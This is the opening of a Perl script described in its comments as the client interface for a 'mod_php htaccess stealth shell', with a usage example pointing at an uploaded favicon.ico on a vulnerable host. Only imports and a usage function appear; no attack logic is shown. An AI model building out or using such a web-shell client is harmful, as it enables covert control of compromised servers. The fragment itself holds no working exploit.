#!/usr/bin/perl
# Interface for the mod_php htaccess stealth shell
# Written by Wireghoul - http://www.justanotherhacker.com

use warnings;
use strict;
use MIME::Base64;

sub usage {
    print "Usage: $0 url\nExample: $0 http://vuln.com/upload/favicon.ico\n";
}
